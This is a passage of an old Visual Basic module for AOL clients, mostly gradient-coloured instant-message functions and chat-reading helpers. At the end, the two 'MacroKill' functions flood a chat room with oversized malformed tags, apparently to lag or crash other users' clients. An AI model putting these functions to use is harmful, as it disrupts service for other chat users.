        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueYellowBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBoldBlackBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackPurpleBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackedRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackYellowBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBluePurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBluePurpleBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueRedBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldBlueYellowBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
         AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
        AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenPurpleGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenRedGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreenYellowGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
        AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
         AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyBlueGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
        AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyGreenGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
        AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyPurpleGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyRedGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImGreyYellowGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBoldGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenPurpleGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenRedGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreenYellowGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreyBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreyBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreyBlueGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreyGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldGreyGreenGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldGreyPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldGreyPurpleGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldGreyRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldGreyRedGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldGreyYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AiM_ImBoldGreyYellowGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_LastChatLineWithSnToList(Lst As ListBox)
'Put this in a timer

Lst.ListIndex = Lst.ListCount - 1
If Lst.text Like ("*" & AoL4_SNFromLastChatLine & "*") Then
   Exit Function
Else
   Lst.AddItem (AoL4_SNFromLastChatLine & ": " & AoL4_LastChatLine)
End If
End Function

Function Program_Minimize(frm As Form)
frm.WindowState = 1
End Function

Function Program_Maximize(frm As Form)
frm.WindowState = 2
End Function

Function Program_Normal(frm As Form)
frm.WindowState = 0
End Function

Function Program_Hide(frm As Form)
frm.Hide
End Function

Function Program_Show(frm As Form)
frm.Show
End Function

Function Program_Unload(frm As Form)
Unload frm
End Function

Function Program_End()
End
End Function

Function AoL4_GetText(Child)
GetTrim = SenditbyNum(Child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SenditByString(Child, 13, GetTrim + 1, TrimSpace$)
AoL4_GetText = TrimSpace$
End Function

Function AoL4_LastChatLineWithSN()
ChatText$ = AoL4_GetChatText
For FindChar = 1 To Len(ChatText$)
TheChar$ = Mid(ChatText$, FindChar, 1)
TheChars$ = TheChars$ & TheChar$
If TheChar$ = Chr(13) Then
TheChatText$ = Mid(TheChars$, 1, Len(TheChars$) - 1)
TheChars$ = ""
End If
Next FindChar
lastlen = Val(FindChar) - Len(TheChars$)
LastLine = Mid(ChatText$, lastlen, Len(TheChars$))
AoL4_LastChatLineWithSN = LastLine
End Function

Function AoL4_LastChatLine()
chatline$ = AoL4_LastChatLineWithSN
If chatline$ = "" Then Exit Function
ChatTrim$ = Left$(chatline$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
ScreenName$ = SN
ChatTrimNum = Len(ScreenName$)
ChatTrim$ = Mid$(chatline$, ChatTrimNum + 4, Len(chatline$) - Len(ScreenName$))
AoL4_LastChatLine = ChatTrim$
End Function
Function AoL3_LastChatLine()
chatline$ = AoL3_LastChatLineWithSn
If chatline$ = "" Then Exit Function
ChatTrim$ = Left$(chatline$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 2)
    End If
Next Z
ScreenName$ = SN
ChatTrimNum = Len(ScreenName$)
ChatTrim$ = Mid$(chatline$, ChatTrimNum + 4, Len(chatline$) - Len(ScreenName$))
AoL3_LastChatLine = ChatTrim$
End Function

Function AoL4_FindToolbar()
Toolbar% = FindIt(AOLWindow, "AOL Toolbar")
toolbar2% = FindIt(Toolbar%, "_AOL_Toolbar")
AoL4_FindToolbar = toolbar2%
End Function
Function AoL4_SNFromLastChatLine()
ChatText$ = AoL4_LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For i = 1 To 11
    If Mid$(ChatTrim$, i, 1) = ":" Then
        SN = Left$(ChatTrim$, i - 1)
    End If
Next i
AoL4_SNFromLastChatLine = SN
End Function
Function AoL3_SnFromLastChatLine()
ChatText$ = AoL3_LastChatLineWithSn
ChatTrim$ = Left$(ChatText$, 11)
For i = 1 To 11
    If Mid$(ChatTrim$, i, 1) = ":" Then
        SN = Left$(ChatTrim$, i - 1)
    End If
Next i
AoL3_SnFromLastChatLine = SN
End Function

Function AoL4_MacroKill()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 1940
a = a & "@"
Next
AoL4_ChatSend ".<p=" & a
TimeOut 0.1
AoL4_ChatSend ".<p=" & a
End Function
Function AoL4_MacroKill2()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 1940
a = a & "%"
Next
AoL4_ChatSend ".<p=" & a
TimeOut 0.1
AoL4_ChatSend ".<p=" & a
End Function
